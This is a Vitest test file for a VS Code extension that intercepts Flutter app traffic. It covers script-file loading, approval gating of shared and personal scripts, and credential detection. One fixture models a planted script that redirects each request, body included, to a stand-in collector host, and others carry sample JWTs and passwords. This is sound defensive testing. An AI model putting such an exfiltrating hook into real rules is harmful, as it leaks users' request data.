/** CONTRACTS §13.4: script files, the approval gate for shared scripts, secret checks and the template (src/rules/**). */
import { beforeEach, describe, expect, it } from 'vitest';
import type { Rule } from '@flutter-intercept/proxy';
import { APPROVALS_KEY, MAX_REVIEW_CODE_CHARS, ruleApprovalHash, SCRIPT_APPROVALS_KEY, SharedRulesCore, WorkspaceFolderInfo } from '../../src/rules/core';
import { contentHash, toFileRule } from '../../src/rules/file';
import { approvalReasons, scriptFileSecretProblem, scriptSecretKind, secretProblem } from '../../src/rules/policy';
import { defaultScriptFilePath, MAX_SCRIPT_FILE_BYTES, ScriptFileError, scriptFileSyntaxError, SCRIPTS_DIR, scriptTemplate } from '../../src/rules/scriptFile';
import { FakeFs, FakeMemento, FILE, fakeValidateRule, ROOT, script } from './rules.fakes';

const JWT = 'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U';
const OPAQUE = ['Xq8Lm2Rt7Vb4', 'Nz9Kc5Hw3Jp6', 'Fd1Gs0Ya'].join('');
const fileJson = (rules: unknown[]) => JSON.stringify({ version: 1, rules }, null, 2);
const SCRIPT = `${ROOT}/scripts/a.js`;

let fs: FakeFs;
let memento: FakeMemento;
let folders: WorkspaceFolderInfo[];
let watched: string[];
let reloads: number;
let core: SharedRulesCore;

beforeEach(() => {
  fs = new FakeFs();
  memento = new FakeMemento();
  folders = [{ name: 'app', path: ROOT }];
  watched = [];
  reloads = 0;
  fs.put(`${ROOT}/pubspec.yaml`, 'name: app\n');
  core = new SharedRulesCore({
    folders: () => folders,
    fs,
    validateRule: fakeValidateRule,
    memento,
    watchBodyFile: (f, rel) => watched.push(`${f}|${rel}`),
    requestReload: () => reloads++,
  });
});

describe('script file resolution', () => {
  it('reads a workspace-relative .js file and watches it', async () => {
    fs.put(SCRIPT, '\ufefffunction onRequest() {}');
    await core.approveScriptFile('scripts/a.js');
    expect(await core.readScriptFile('scripts/a.js', ROOT)).toBe('function onRequest() {}');
    expect([...new Set(watched)]).toEqual([`${ROOT}|scripts/a.js`]);
  });

  it('refuses non-.js, absolute, outside, missing, directories, too large and non-UTF-8 files', async () => {
    fs.put(`${ROOT}/scripts/a.txt`, 'x');
    fs.put('/ws/other/b.js', 'x');
    fs.put(`${ROOT}/big.js`, new Uint8Array(MAX_SCRIPT_FILE_BYTES + 1));
    fs.put(`${ROOT}/ok.js`, new Uint8Array(MAX_SCRIPT_FILE_BYTES));
    fs.put(`${ROOT}/bin.js`, new Uint8Array([0x61, 0xff]));
    await fs.mkdir(`${ROOT}/dir.js`);
    const fail = (rel: string) => core.readScriptFile(rel, ROOT);
    await expect(fail('scripts/a.txt')).rejects.toThrow('script file "scripts/a.txt" must be a .js file');
    await expect(fail('/ws/app/scripts/a.js')).rejects.toThrow('must be relative to the workspace folder (not absolute)');
    await expect(fail('../other/b.js')).rejects.toThrow('script file ../other/b.js must be inside the workspace');
    await expect(fail('scripts/missing.js')).rejects.toThrow('script file scripts/missing.js not found');
    await expect(fail('dir.js')).rejects.toThrow('script file dir.js is not a regular file');
    await expect(fail('big.js')).rejects.toThrow('script file big.js is larger than 256 KB');
    await expect(fail('bin.js')).rejects.toThrow('script file bin.js is not UTF-8 text');
    await expect(fail('bin.js')).rejects.toBeInstanceOf(ScriptFileError);
    await core.approveScriptFile('ok.js');
    expect((await fail('ok.js')).length).toBe(MAX_SCRIPT_FILE_BYTES);
  });

  it('syntax check', () => {
    expect(scriptFileSyntaxError('a.js')).toBeUndefined();
    expect(scriptFileSyntaxError('A.JS')).toBeUndefined();
    expect(scriptFileSyntaxError('a.mjs')).toBe('must be a .js file');
    expect(scriptFileSyntaxError('')).toBe('must be a non-empty path');
    expect(scriptFileSyntaxError('C:\\x\\a.js')).toMatch(/not absolute/);
  });

  it('resolveBodies reads approved personal script files into code; a missing file skips the rule (never empty code)', async () => {
    await core.reload();
    fs.put(SCRIPT, 'function onRequest(r) { return r; }');
    await core.approveScriptFile('scripts/a.js');
    const inline = script('i', { code: 'function onResponse() {}' });
    const { rules, problems } = await core.resolveBodies([script('p', { file: 'scripts/a.js' }), script('q', { file: 'scripts/none.js', name: 'Gone' }), inline]);
    expect(rules.map((r) => [r.id, (r.action as { code: string }).code])).toEqual([
      ['p', 'function onRequest(r) { return r; }'],
      ['i', 'function onResponse() {}'],
    ]);
    expect(rules[1]).toBe(inline); // untouched
    expect(problems).toEqual(['Rule "Gone" is off: script file scripts/none.js not found']);
  });
});

describe('approval of shared scripts', () => {
  it('holds every shared script rule, inline or file, with a reason', async () => {
    fs.put(SCRIPT, 'function onRequest() {}');
    fs.put(FILE, fileJson([{ id: 'inline', match: { url: '*' }, action: { kind: 'script', code: 'function onRequest() {}' } }, { id: 'f', match: { url: '*' }, action: { kind: 'script', file: 'scripts/a.js' } }]));
    await core.reload();
    expect(core.state().rules).toEqual([]);
    expect(core.state().pendingApproval.map((r) => r.id)).toEqual(['shared:inline', 'shared:f']);
    expect(core.state().pendingApproval[1].action).toEqual({ kind: 'script', file: 'scripts/a.js', code: '' }); // code filled for the validator
    expect(core.pendingReasons()).toEqual([
      'Rule "inline" (any method *): runs JavaScript that can read, change and redirect every matching request, including its credentials (inline code in the shared rules file)',
      'Rule "f" (any method *): runs JavaScript that can read, change and redirect every matching request, including its credentials (scripts/a.js)',
    ]);
    expect(watched).toContain(`${ROOT}|scripts/a.js`); // read for the hash, so watched
    expect(core.isScriptFile(SCRIPT)).toBe(true);
    expect(core.isScriptFile(`${ROOT}/scripts/b.js`)).toBe(false);
    // REVIEW-7 #5: the items carry the code to review
    expect(core.pendingSnapshot().items.map((i) => [i.id, i.script])).toEqual([
      ['shared:inline', { code: 'function onRequest() {}' }],
      ['shared:f', { file: 'scripts/a.js', path: SCRIPT, code: 'function onRequest() {}' }],
    ]);
  });

  it('a held shared script never resolves; approved it does; a changed file re-holds it', async () => {
    fs.put(SCRIPT, 'function onRequest() { /* v1 */ }');
    fs.put(FILE, fileJson([{ id: 'f', match: { url: '*' }, action: { kind: 'script', file: 'scripts/a.js' } }]));
    await core.reload();
    const held = core.state().pendingApproval[0];
    await expect(core.readScriptFile('scripts/a.js', ROOT, 'shared:f')).rejects.toThrow('is not approved for this shared rule');
    expect((await core.resolveBodies([held])).problems).toEqual(['Rule "f" is off: script file scripts/a.js is not approved for this shared rule']);

    await core.approvePending(core.pendingSnapshot().hash);
    expect(core.state().rules.map((r) => r.id)).toEqual(['shared:f']);
    const { rules } = await core.resolveBodies(core.state().rules);
    expect((rules[0].action as { code: string }).code).toBe('function onRequest() { /* v1 */ }');
    expect(await core.reload()).toBe(false); // same content: stays approved

    // edited before the watcher's reload: refused, and a reload is requested
    fs.put(SCRIPT, 'function onRequest() { /* v2 */ }');
    core.invalidateBodyFile();
    await expect(core.readScriptFile('scripts/a.js', ROOT, 'shared:f')).rejects.toThrow('changed since the shared rule was approved');
    expect(reloads).toBe(1);
    // the reload re-holds it (the rule itself stays approved; only the new contents need review)
    expect(await core.reload()).toBe(true);
    expect(core.state().rules).toEqual([]);
    expect(core.state().pendingApproval.map((r) => r.id)).toEqual(['shared:f']);
    expect((memento.get(APPROVALS_KEY) as Record<string, string[]>)[ROOT]).toHaveLength(1);
    expect(core.pendingSnapshot().items[0].script?.code).toBe('function onRequest() { /* v2 */ }');

    // approving again covers v2; going back to the approved v1 is fine, an unseen v3 holds it again
    await core.approvePending();
    expect(core.state().rules.map((r) => r.id)).toEqual(['shared:f']);
    fs.put(SCRIPT, 'function onRequest() { /* v1 */ }');
    await core.reload();
    expect(core.state().rules.map((r) => r.id)).toEqual(['shared:f']);
    fs.put(SCRIPT, 'function onRequest() { /* v3 */ }');
    await core.reload();
    expect(core.state().pendingApproval.map((r) => r.id)).toEqual(['shared:f']);
    // a changed rule (same script) is held again too
    await core.approvePending();
    fs.put(FILE, fileJson([{ id: 'f', match: { url: 'https://other.example.com/*' }, action: { kind: 'script', file: 'scripts/a.js' } }]));
    await core.reload();
    expect(core.state().pendingApproval.map((r) => r.id)).toEqual(['shared:f']);
  });

  it('a missing script file: held; once approved the rule is skipped; the file appearing re-holds it', async () => {
    fs.put(FILE, fileJson([{ id: 'f', match: { url: '*' }, action: { kind: 'script', file: 'scripts/a.js' } }]));
    await core.reload();
    await core.approvePending();
    expect(core.state().rules.map((r) => r.id)).toEqual(['shared:f']);
    expect((await core.resolveBodies(core.state().rules)).problems).toEqual(['Rule "f" is off: script file scripts/a.js not found']);
    fs.put(SCRIPT, 'function onRequest() {}');
    await core.reload();
    expect(core.state().pendingApproval.map((r) => r.id)).toEqual(['shared:f']);
  });

  it('two rules sharing one script file are re-held together; an inline script is re-held when its code changes', async () => {
    fs.put(SCRIPT, 'function onRequest() {}');
    const inline = (code: string) => ({ id: 'i', match: { url: '*' }, action: { kind: 'script', code } });
    const f = (id: string) => ({ id, match: { url: `https://api.example.com/${id}` }, action: { kind: 'script', file: 'scripts/a.js' } });
    fs.put(FILE, fileJson([f('a'), f('b'), inline('function onRequest() {}')]));
    await core.reload();
    await core.approvePending();
    expect(core.state().rules).toHaveLength(3);
    fs.put(SCRIPT, 'function onResponse() {}');
    await core.reload();
    expect(core.state().pendingApproval.map((r) => r.id)).toEqual(['shared:a', 'shared:b']);
    await core.approvePending();
    fs.put(FILE, fileJson([f('a'), f('b'), inline('function onResponse() {}')]));
    await core.reload();
    expect(core.state().pendingApproval.map((r) => r.id)).toEqual(['shared:i']);
  });

  it('the snapshot hash covers the script contents (a change while deciding refuses the approval)', async () => {
    fs.put(SCRIPT, 'function onRequest() {}');
    fs.put(FILE, fileJson([{ id: 'f', match: { url: '*' }, action: { kind: 'script', file: 'scripts/a.js' } }]));
    await core.reload();
    const snap = core.pendingSnapshot();
    fs.put(SCRIPT, 'function onRequest() { return { response: { status: 200, headers: {} } }; }');
    await core.reload();
    await expect(core.approvePending(snap.hash)).rejects.toThrow(/changed while you were deciding/);
  });

  it('keeps the existing mapRemote reasons alongside', () => {
    expect(approvalReasons({ id: 'shared:m', enabled: true, match: { url: '*' }, action: { kind: 'mapRemote', to: 'https://staging.example.com' } })).toEqual([
      "sends the app's requests to https://staging.example.com instead of the real server",
    ]);
  });
});

describe('sharing script rules', () => {
  it('sharing an inline script writes the code and approves it (the user\'s own rule)', async () => {
    await core.reload();
    const shared = await core.share(script('mine', { code: 'function onRequest(r, c) { c.log("hi"); }' }));
    expect(shared.id).toBe('shared:mine');
    expect(core.state().rules.map((r) => r.id)).toEqual(['shared:mine']);
    expect(JSON.parse(fs.text(FILE)!).rules[0].action).toEqual({ kind: 'script', code: 'function onRequest(r, c) { c.log("hi"); }' });
  });

  it('sharing a file-backed script keeps the reference (no code in the file) and approves its current contents', async () => {
    await core.reload();
    fs.put(SCRIPT, 'function onRequest() {}');
    await core.approveScriptFile('scripts/a.js'); // the personal rule was running it: approved
    await core.share(script('mine', { file: 'scripts/a.js', code: 'function onRequest() {}' }));
    expect(JSON.parse(fs.text(FILE)!).rules[0].action).toEqual({ kind: 'script', file: 'scripts/a.js' });
    expect(core.state().rules.map((r) => r.id)).toEqual(['shared:mine']);
    const { rules } = await core.resolveBodies(core.state().rules);
    expect((rules[0].action as { code: string }).code).toBe('function onRequest() {}');
    // a teammate edits the file: held again
    fs.put(SCRIPT, 'function onRequest() { /* changed */ }');
    await core.reload();
    expect(core.state().pendingApproval.map((r) => r.id)).toEqual(['shared:mine']);
  });

  it('refuses inline code (and script file contents) that look like real credentials; placeholders are fine', async () => {
    await core.reload();
    await expect(core.share(script('jwt', { code: `function onRequest(r) { r.headers.authorization = 'Bearer ${JWT}'; return r; }` }))).rejects.toThrow(
      /^Not shared: rule "jwt" — the script contains what looks like a JWT\./,
    );
    await expect(core.share(script('key', { code: `const apiKey = "${OPAQUE}";` }))).rejects.toThrow(/the script contains what looks like a long random token/);
    await expect(core.share(script('pw', { code: "const password = 'hunter2hunter2';" }))).rejects.toThrow(/the script contains what looks like a credential \(in "password"\)/);
    fs.put(SCRIPT, `request.headers['x-api-key'] = 'k3y-for-prod-1';`);
    await expect(core.share(script('file', { file: 'scripts/a.js' }))).rejects.toThrow(/the script file scripts\/a\.js contains what looks like a credential \(in "x-api-key"\)/);
    expect(fs.files.has(FILE)).toBe(false);
    await core.share(script('ok', { code: "function onRequest(r) { r.headers['authorization'] = 'Bearer test-token'; r.headers['x-api-key'] = `${r.url}`; return r; }" }));
    expect(core.state().rules.map((r) => r.id)).toEqual(['shared:ok']);
  });
});

describe('secret checks (policy)', () => {
  it('scriptSecretKind', () => {
    expect(scriptSecretKind(`const t = "${JWT}";`)).toBe('a JWT');
    expect(scriptSecretKind(`headers["Authorization"] = "Basic dXNlcjpwYXNzd29yZDEyMw=="`)).toBe('a Bearer/Basic credential');
    expect(scriptSecretKind(`({ token: 'r3al-t0ken-value' })`)).toBe('a credential (in "token")');
    expect(scriptSecretKind(`const token = 'your-token-here';`)).toBeUndefined();
    expect(scriptSecretKind('if (token === "abcdefgh") {}')).toBeUndefined(); // a comparison, not an assignment
    expect(scriptSecretKind('const token = `Bearer ${refreshed}`;')).toBeUndefined();
    expect(scriptSecretKind('const tokenUrl = "https://auth.example.com/token";')).toBeUndefined();
    expect(scriptSecretKind(scriptTemplate({ name: 'Login' }))).toBeUndefined();
  });

  it('secretProblem for script rules; scriptFileSecretProblem', () => {
    const r = (action: Rule['action']): Rule => ({ id: 'r', enabled: true, name: 'R', match: { url: '*' }, action });
    expect(secretProblem(r({ kind: 'script', code: 'const a = 1;' }))).toBeUndefined();
    expect(secretProblem(r({ kind: 'script', code: `const a = "${JWT}";` }))).toMatch(/the script contains what looks like a JWT/);
    // with a file the inline (resolved) code is not what gets committed: the file is checked when readable
    expect(secretProblem(r({ kind: 'script', code: `const a = "${JWT}";`, file: 'a.js' }))).toBeUndefined();
    expect(secretProblem(r({ kind: 'script', code: '', file: 'a.js' }), () => `const a = "${JWT}";`)).toMatch(/the script file a\.js contains what looks like a JWT/);
    expect(scriptFileSecretProblem(`const secret = "${OPAQUE}";`)).toMatch(/^Not written: the script contains what looks like a long random token\./);
    expect(scriptFileSecretProblem(scriptTemplate())).toBeUndefined();
  });

  it('toFileRule drops resolved code of a file-backed script', () => {
    expect(toFileRule(script('x', { file: 'a.js', code: 'resolved' }), 'x').action).toEqual({ kind: 'script', file: 'a.js' });
    expect(toFileRule(script('x', { code: 'inline' }), 'x').action).toEqual({ kind: 'script', code: 'inline' });
  });
});

describe('script template and "Edit script in a file"', () => {
  it('default path and template', () => {
    expect(SCRIPTS_DIR).toBe('.vscode/flutter-intercept/scripts');
    expect(defaultScriptFilePath({ name: 'Add Debug Header!', match: { url: '*' } })).toBe('.vscode/flutter-intercept/scripts/add-debug-header.js');
    expect(defaultScriptFilePath({ match: { url: 'https://api.example.com/v1/users/*' } })).toBe('.vscode/flutter-intercept/scripts/v1-users.js');
    expect(defaultScriptFilePath({ match: { url: '*' } })).toBe('.vscode/flutter-intercept/scripts/script.js');
    const t = scriptTemplate({ name: 'Login\n*/ evil' });
    expect(t.split('\n')[0]).toBe('// Flutter Intercept script for the rule "Login * / evil".');
    for (const s of ['function onRequest(request, context)', 'function onResponse(response, request, context)', 'context.log(', 'request.headers[', 'JSON.parse(response.body)']) expect(t).toContain(s);
    // valid JavaScript, and the hooks behave as documented
    const hooks = new Function(`${t}\nreturn { onRequest, onResponse };`)() as {
      onRequest: (r: unknown, c: unknown) => { headers: Record<string, string> };
      onResponse: (r: unknown, q: unknown, c: unknown) => { body: string } | undefined;
    };
    const logs: unknown[][] = [];
    const context = { ruleId: 'r', exchangeId: 'e', log: (...a: unknown[]) => logs.push(a) };
    const req = { method: 'GET', url: 'https://api.example.com/a', headers: {} };
    expect(hooks.onRequest(req, context).headers['x-debug']).toBe('flutter-intercept');
    expect(JSON.parse(hooks.onResponse({ status: 200, headers: {}, body: '{"a":1}' }, req, context)!.body)).toEqual({ a: 1, editedBy: 'flutter-intercept' });
    expect(hooks.onResponse({ status: 200, headers: {}, body: 'not json' }, req, context)).toBeUndefined();
    expect(logs).toHaveLength(2);
  });

  it('createScriptFile writes the template (or given code) without overwriting, and refuses credentials', async () => {
    await core.reload();
    const rule = script('s', { name: 'Debug header' });
    const rel = await core.createScriptFile(rule);
    expect(rel).toBe('.vscode/flutter-intercept/scripts/debug-header.js');
    expect(fs.text(`${ROOT}/${rel}`)).toBe(scriptTemplate(rule));
    expect(watched).toContain(`${ROOT}|${rel}`);
    expect(await core.createScriptFile(rule, 'function onRequest() {}')).toBe('.vscode/flutter-intercept/scripts/debug-header-2.js');
    expect(fs.text(`${ROOT}/.vscode/flutter-intercept/scripts/debug-header-2.js`)).toBe('function onRequest() {}');
    await expect(core.createScriptFile(rule, `const t = "${JWT}";`)).rejects.toThrow(/^Not written: the script contains what looks like a JWT/);
    await expect(core.createScriptFile(rule, 'x'.repeat(MAX_SCRIPT_FILE_BYTES + 1))).rejects.toThrow('The script is larger than 256 KB');
    expect(core.checkScriptFileContent('const a = 1;')).toBeUndefined();
    expect(await core.readScriptFile(rel, ROOT)).toBe(scriptTemplate(rule));
  });
});

describe('approval hashes stay stable for other rules', () => {
  it('rules without scripts hash as before (existing approvals keep working)', () => {
    const r: Rule = { id: 'shared:m', enabled: true, match: { url: '*' }, action: { kind: 'mapRemote', to: 'https://staging.example.com' } };
    expect(ruleApprovalHash(ROOT, 'm', r)).toBe(contentHash({ folder: ROOT, id: 'm', rule: { id: 'm', match: { url: '*' }, action: { kind: 'mapRemote', to: 'https://staging.example.com' } } }));
  });
});

describe('personal script files need approval (REVIEW-7 #1)', () => {
  const PLANTED = `${ROOT}/.vscode/flutter-intercept/scripts/login.js`;
  const REL = '.vscode/flutter-intercept/scripts/login.js';
  const EVIL = "function onRequest(r) { return { ...r, url: 'https://collector.example/?' + encodeURIComponent(r.body || '') }; }";

  it('a planted file is never run for a personal rule until approved, and the rule is listed with the code to review', async () => {
    fs.put(PLANTED, EVIL);
    await core.reload();
    const rule = script('p1', { name: 'Login', file: REL });
    expect(await core.setPersonalRules([rule, script('inline', { code: 'function onRequest() {}' })])).toBe(true);
    expect(core.state().rules).toEqual([]);
    expect(core.state().pendingApproval.map((r) => r.id)).toEqual(['p1']); // inline personal code: no approval
    expect(core.status()).toEqual({ count: 0, problems: [], pendingApproval: 1, file: undefined });
    const snap = core.pendingSnapshot();
    expect(snap.items).toEqual([
      {
        id: 'p1',
        folder: 'personal rules',
        personal: true,
        name: '"Login"',
        match: 'any method https://api.example.com/p1',
        reason: `runs a script file you haven't approved yet, or that changed outside VS Code (${REL})`,
        script: { file: REL, path: PLANTED, code: EVIL },
      },
    ]);
    expect(core.pendingReasons()).toEqual([
      `Rule "Login" (any method https://api.example.com/p1): runs a script file you haven't approved yet, or that changed outside VS Code (${REL}) [personal rules]`,
    ]);
    const { rules, problems } = await core.resolveBodies([rule]);
    expect(rules).toEqual([]);
    expect(problems[0]).toMatch(/waits for your approval/);

    await core.approvePending(snap.hash);
    expect(core.state().pendingApproval).toEqual([]);
    expect((await core.resolveBodies([rule])).rules.map((r) => (r.action as { code: string }).code)).toEqual([EVIL]);
    expect(memento.get(SCRIPT_APPROVALS_KEY)).toEqual({ [ROOT]: { [REL]: [expect.any(String)] } });
  });

  it('a change from outside VS Code (git pull) holds the personal rule again; a save in VS Code approves it', async () => {
    await core.reload();
    const rule = script('p1', { name: 'Login', file: REL });
    const rel = await core.createScriptFile(rule, 'function onRequest() { /* mine */ }');
    expect(rel).toBe(REL);
    await core.setPersonalRules([rule]);
    expect(core.state().pendingApproval).toEqual([]); // created here: approved
    expect(await core.readScriptFile(REL, ROOT, 'p1')).toBe('function onRequest() { /* mine */ }');

    fs.put(PLANTED, EVIL); // git pull
    core.invalidateBodyFile();
    await core.reload();
    expect(core.state().pendingApproval.map((r) => r.id)).toEqual(['p1']);
    await expect(core.readScriptFile(REL, ROOT, 'p1')).rejects.toThrow(/waits for your approval/);

    fs.put(PLANTED, 'function onRequest() { /* edited in VS Code */ }');
    core.invalidateBodyFile();
    expect(await core.noteScriptFileSaved(PLANTED)).toBe(true);
    expect(core.state().pendingApproval).toEqual([]);
    expect(await core.readScriptFile(REL, ROOT, 'p1')).toBe('function onRequest() { /* edited in VS Code */ }');
    expect(await core.noteScriptFileSaved(`${ROOT}/lib/main.dart`)).toBe(false);
  });

  it('a planted file is never reused by createScriptFile', async () => {
    fs.put(PLANTED, EVIL);
    await core.reload();
    const rel = await core.createScriptFile(script('p1', { name: 'Login' }), 'function onRequest() {}');
    expect(rel).toBe('.vscode/flutter-intercept/scripts/login-2.js');
    expect(fs.text(PLANTED)).toBe(EVIL);
  });

  it('resolution alone lists a personal rule the core was not told about; a disabled rule is not held', async () => {
    fs.put(PLANTED, EVIL);
    await core.reload();
    await expect(core.readScriptFile(REL, ROOT, 'p9')).rejects.toThrow(/waits for your approval/);
    expect(core.state().pendingApproval.map((r) => [r.id, r.action])).toEqual([['p9', { kind: 'script', code: '', file: REL }]]);
    await expect(core.readScriptFile(REL, ROOT)).rejects.toThrow(/waits for your approval/); // no id: checked too
    await core.setPersonalRules([script('p9', { file: REL, enabled: false })]);
    expect(core.state().pendingApproval).toEqual([]);
  });

  it('approveScriptFile approves the current contents only; noteScriptFileSaved approves files approved before', async () => {
    await core.reload();
    fs.put(SCRIPT, 'v1');
    await core.approveScriptFile('scripts/a.js');
    await core.setPersonalRules([script('p', { file: 'scripts/a.js' })]);
    expect(core.state().pendingApproval).toEqual([]);
    fs.put(SCRIPT, 'v2');
    core.invalidateBodyFile();
    await core.setPersonalRules([script('p', { file: 'scripts/a.js' })]);
    expect(core.state().pendingApproval.map((r) => r.id)).toEqual(['p']);
    // not referenced by any rule, but approved before (created here): a save approves it
    await core.setPersonalRules([]);
    fs.put(SCRIPT, 'v3');
    core.invalidateBodyFile();
    expect(await core.noteScriptFileSaved(SCRIPT)).toBe(true);
    await core.setPersonalRules([script('p', { file: 'scripts/a.js' })]);
    expect(core.state().pendingApproval).toEqual([]);
    // never approved and not used by a rule: a save doesn't approve it
    fs.put(`${ROOT}/scripts/other.js`, 'x');
    expect(await core.noteScriptFileSaved(`${ROOT}/scripts/other.js`)).toBe(false);
    await expect(core.approveScriptFile('scripts/none.js')).rejects.toThrow('not found');
  });

  it('shared script review text: long code is capped, unreadable files say why; a save approves the contents only', async () => {
    const long = `// ${'x'.repeat(MAX_REVIEW_CODE_CHARS + 10)}`;
    fs.put(SCRIPT, long);
    fs.put(FILE, fileJson([{ id: 'f', match: { url: '*' }, action: { kind: 'script', file: 'scripts/a.js' } }, { id: 'g', match: { url: '*' }, action: { kind: 'script', file: 'scripts/gone.js' } }]));
    await core.reload();
    const [f, g] = core.pendingSnapshot().items;
    expect(f.script).toEqual({ file: 'scripts/a.js', path: SCRIPT, code: long.slice(0, MAX_REVIEW_CODE_CHARS), truncated: true });
    expect(g.script).toEqual({ file: 'scripts/gone.js', path: `${ROOT}/scripts/gone.js`, code: '', error: 'script file scripts/gone.js not found' });
    // saving the shared rule's script in VS Code approves the file contents; the rule still needs its own approval
    expect(await core.noteScriptFileSaved(SCRIPT)).toBe(true);
    expect(core.state().pendingApproval.map((r) => r.id)).toEqual(['shared:f', 'shared:g']);
    await core.approvePending();
    fs.put(SCRIPT, 'function onRequest() {}');
    core.invalidateBodyFile();
    await core.noteScriptFileSaved(SCRIPT);
    expect(core.state().rules.map((r) => r.id)).toEqual(['shared:f', 'shared:g']);
  });
});
